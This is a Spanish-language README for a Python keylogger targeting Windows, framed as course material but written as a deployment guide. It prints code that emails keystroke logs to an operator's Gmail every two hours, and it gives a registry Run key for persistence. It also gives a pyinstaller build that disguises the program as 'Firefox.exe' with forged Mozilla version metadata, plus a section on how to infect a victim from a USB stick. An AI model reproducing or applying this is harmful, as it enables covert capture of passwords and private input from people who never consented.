# Keylogger para Windows - Python
__Actual:__  `v2.0`

__Documentación actualizada:__ `19-04-2020`


__Nota importante:__ Esta herramienta tiene como proposito general y de uso exclusivo para aprendizaje, se creó como parte de un curso Online de hacking de "Seguridad de sistemas informáticos", no me hago responsable de un posible mal uso de ésta herramienta.

Las razones del uso de un Keylogger son para fines de seguridad de una empresa, ya sea que estén viendo qué está haciendo el personal, cómo interactúan sus personas en las computadoras o que los atacantes intenten obtener información confidencial, como información de inicio de sesión u otros datos confidenciales. Este programa simplemente toma cada pulsación de tecla ingresada en el teclado y luego envía el archivo de registro por correo electrónico cada 2 horas.

## Carpeta Principal
![Archivos](https://i.imgur.com/x984atN.png)
- `icon.ico`    = Icono 
- `KeyloggerWindows.py` = Código fuente del Keylogger
- `LICENCE` = Licencia 
- `README.md`= Documentación
- `StartUp.reg` = Modifica el Registro de Windows
- `version.txt` = Información detalla de conversión `.py` a `.exe`
- `WindowsDefender.exe` = Keylogger Compilado 

## Caracteristicas
- __Envío por Gmail:__ Envía el registro de teclas por Gmail.
- __Recibe datos por varios correos:__ Hay una posibilidad de agregar 1 o más correos, y así el registro de notas se envíe a varios correos a la vez,
- __Verifica conexión a internet:__ El keylogger verifica si la computadora está conectada a internet, y si ese es el caso envía los datos, en caso contrario, no lo envía,
- __Tiempo de envío personalizado:__ Usted puede elegir un intervalo de tiempo personalizado, en la cual desea que se envíe los archivos, `No se recomienta que sean muy seguidos, ya que el servidor de mensajería de google, bloqueará la cuenta por 1 día,  por eso el tiempo de intervalo de envío escogida es de 2 Horas, éstas horas se cuentan despues de iniciar el script`
- __Obtención de datos a prueba de errores:__ En otros keylogger al momento de enviar el `log.txt`, éste proceso demora entre 3 a 5 segundos, y en ese transcurso de tiempo el keylogger no obtiene el registro de teclas, en éste keylogger, ese error está solucionado, obteniendo siempre los datos
- __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, y mostrará cierta información, estó se dejó así con el afán de verificar un posible error, pero al ser convertida a `*.exe` se utilizara un comando para que ésta se ejecute en segundo plano.
- __Intruso total:__ Al momento de ser convertido de `*.py a *.exe`, ésta pasará por un proceso para que se haga pasar por otro programa.
- __Oculto:__ El Keylogger al iniciar se copia (Solo si ya está en un archivo *exe) a la carpeta `C:\Users\Public` , y en esa carpeta encuentras el archivo `log.txt`.
- __Iniciar automaticamente con el sistema:__ Se encuentra un archivo llamado `StartUp.reg`, la cual al ejecutarlo, ésta escribe el registro y permite que el keylogger se ejecute al iniciar sesión.


## Caracteristicas en proceso de Desarrollo: 
- __Segundo Gmail en caso de bloqueo:__ En casó el correo principal que envía los datos sea bloqueada, en caso de error, se usará otro correo para poder ser envíado
- __Conexión a una base de datos MySQL:__ Los datos recopilados serán enviados por una conexión a una base de datos en vez de por mensajes.  
- __Soporte de envió a otros buzones de correo:__ Se insertará un soporte para poder usar Outlook, yahoo u otros servicios de correo 




## Uso de Recursos de la PC
El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
![Uso del CPU y RAM](https://i.imgur.com/xMRxzX3.png)

## Requerimiento de Paquetes:
- import pynput
- import getuser 
- import datetime
- import os
- import time
- import yagmail
- import socket
- import threading

# Preparación:
1. Use  `git clone https://github.com/SebastianEPH/Keylogger-py.git` para descargar el repositorio en su computadora.
2. Abra el archivo `KeyloggerWindows.py` en su editor de texto.
3. La cuenta de google remitente, debe tener habilita el Acceso de apps menos seguras de google, ésta la puedes habilitar entrando a este [link](https://myaccount.google.com/lesssecureapps).  `En caso no lo habilite, el keylogger no podrá iniciar sesión en su Gmail`
4. Buscamos la función `SendLog(log)` y buscamos la variables:
    - `sender_email`  y `sender_password` , escribiremos correo y contraseña del remitente y debe ser una cuenta de Gmail. `En futuras actualizaciones podrán ser otros servicios de mensajería`
    - `receiver_email`, Escribirá el correo destinatario, pueden ser 1 o más.
```` py
# Envía los datos log por Gmail 
def sendLog(log):
    try:
        ## Change correo
        mifecha = datetime.datetime.now()
        sender_email = "SoyElCorreoQueEnviaráLosRegistrosDeTeclas@gmail.com"    #<== Editar
        sender_password = "SoyUnaContraseña"                                    #<== Editar

        receiver_email = ["SoyElQueRecibiráLosRegistros@gmail.com"]             #<== Editar
        # Si deseas 2 a más destinatarios
        # receiver_email = ["correo1@gmail.com", "correo2@hotmail.com"]         #<== Envíar 2 a más correos
        subject = "Dados del usuario: "+ str(getuser())
        yag = yagmail.SMTP(user=sender_email, password=sender_password)
        contenido = "\nFecha: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos"
        contents = [ 
            "Información:\n\nNombre de Usuario: "+ str(getuser()) + contenido
        ]
        yag.send(receiver_email, subject, contents, attachments=log )
        print("**************Se envió****************")
        return True;
    except:
        print("___________________No se envió________________")
        return False
````

5. __Opcional:__ Si deseas modificar el tiempo de intervalo del envío del registro, lo puedes hacer buscando la función `mailInterval()`, el tiempo debe ser modificado en el `for x in range(720):`, y debe estar dividido entre 10.

````py 
def mailInterval():
    n = 1   # Para renombre los archivos
    while (True):
        n = n+1
        # Enviar cada 2 horas aprox
        for x in range(720):    #720 * 100 = 7200 || 7200 segundos es igual a 2 Horas
            time.sleep(10)
            print("Pasó: "+ str(x*10))

        if VerificarConexion(): # Si hay conexión
            # Crea nombre del archivo
            nameFile = "log"+str(n)
            #Renombra el archivo original
            Rename(nameFile)    # para que las nuevas teclas se envien en el siguiente tomo

            #Envía el archivo renombrado
            homedir = 'C:\\Users\\Public\\'+str(nameFile)+".txt"
            print("Proceso de envío")

            # Verifica envío Correcto
            if sendLog(homedir):
                #Si se envíó correctamente, pues elimina el archivo
                os.remove(homedir)
            else:
                # Hay internet, pero no se puedo enviar,
                # por ende el problema pudo ser las credenciales del correo, 
                # asi que se enviará con otro correo
                # time.sleep(10)
                # Enviar con otro correo y credenciales
                pass

        else:   # No hay conexión
            # Seguirá sobreescribiendo el archivo
            # No hará nada, y esperará que aya una conexión exitosa
            pass
````
6. __Importante:__ Usted debe buscar la función `CopyKey()` y tendrá que cambiar el valor  de la variable `nameKey`. 

````c
# Debes coloacar el nombre de cómo quieres llamar a tu keyloger, en éste caso se llamará Firefox.exe
nameKey = "Firefox.exe"
````
7. __StartUp:__ Encontrará un archivo StartUp.reg en la carpeta principal y deberás abrirlo y verificar que tenga el mismo nombre que le dió en el paso anterior, ejemplo: `Firefox.exe`.
````re
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"Firefox"="C:\\Users\\Public\\Firefox.exe"
````
Este archivo `StartUp.reg` es el archivo que modificará el registro de windows, y hará que el keylogger se inicie siempre al iniciar sesión.

# Proceso de conversión: `*.py a *.exe`
Se utilizará `pyinstaller`
1. En la carpeta principal encontrará dos archivos, uno llamado `icon.ico` y el otro `version.txt`, éstos 2 archivos son importantes para la conversión del `*.py a *.exe`.
    - `icon.ico` = El icono que tendrá el keylogger al ser convertido
    - `version.txt` = Información detallada del keyloger.
    
    Ambos archivos son importantes para ocultar el `keylogger` o tratar de hacerlo pasar cómo un programa que no es, así como la siguiente imagen:

    ![Imagen1](https://i.imgur.com/wGTfC4T.png)
    ![Imagen2](https://i.imgur.com/Txt3QFS.png)

    Toda esa información puede ser modificada en el archivo de la plantilla `version.txt`
2. __Intruso:__ El el siguiente archivo `version.txt`, puedes modificar la información del `*.exe` la cual se supone que de ser creible.
    ````
    VSVersionInfo(
    ffi=FixedFileInfo(
        filevers=(6, 1, 7601, 17514),
        prodvers=(6, 1, 7601, 17514),
        mask=0x3f,
        flags=0x0,
        OS=0x40004,
        fileType=0x1,
        subtype=0x0,
        date=(0, 0)
        ),
    kids=[
        StringFileInfo(
        [
        StringTable(
            u'040904B0',
            [StringStruct(u'CompanyName', u'Firefox Corporation \xa9 '),
            StringStruct(u'FileDescription', u'Navegador web Firefox'),
            StringStruct(u'FileVersion', u'6.1.7601.17514 (win7sp1_rtm.101119-1850)'),
            StringStruct(u'InternalName', u'Firefox'),
            StringStruct(u'LegalCopyright', u'Firefox and Mozilla Developers. All rights reserved.'),
            StringStruct(u'OriginalFilename', u'Firefox.exe'),
            StringStruct(u'ProductName', u'Firefox\xae'),
            StringStruct(u'ProductVersion', u'6.1.7601.17514')])
        ]), 
        VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
    ]
    )
    ````
3. __Conversión final:__
Mediante Consola debe dirigirse a la carpeta principal.
Los requisitos es tener instalada la librería `pyinstaller`, porfavor mire un tutorial antes de hacer éste proceso, la linea de comando recomendada es la siguiente:

    ````py 
    pyinstaller --clean   --distpath "Keylogger Terminado" -F --windowed --icon icon.ico --version-file version.txt KeyloggerWindows.py
    ````

# ¿Cómo infecto a la victima?
![Final files](https://i.imgur.com/rQRHYVB.png)
Usted tendrá 2 archivos al finalizar la conversión, `Firefox.exe` y `StartUp.reg`, aquellos archivos, puedes tenerlos en un  usb, ya que en el momento de ejecutar `Firefox.exe` , éste archivo, se copiara en la carpeta `C:\Users\Public` y el keylogger está funcionando, usted puede quitar el USB con suma confianza, pero se recomienda dejarlo mínimamente 5 segundos despues de darle doble clic.

Pero para hacer que éste keylogger se ejecute siempre al iniciar sesión, usted debe ejecutar el archivo `StartUp.reg`, 

__Nota:__ No hay un orden fijo, usted puede ejecutar primero el archivo `Firefox.exe` cómo el archivo `StartUp.reg` y  ésto no causará ningún problema.


<!-- Creador  -->
---
## By SebastianEPH
- [Github](https://github.com/SebastianEPH)
- [Facebook](https://www.facebook.com/SebastianEPH)
- [Linkedin](https://www.linkedin.com/in/sebastianeph/)
- [Telegram](https://t.me/sebastianeph)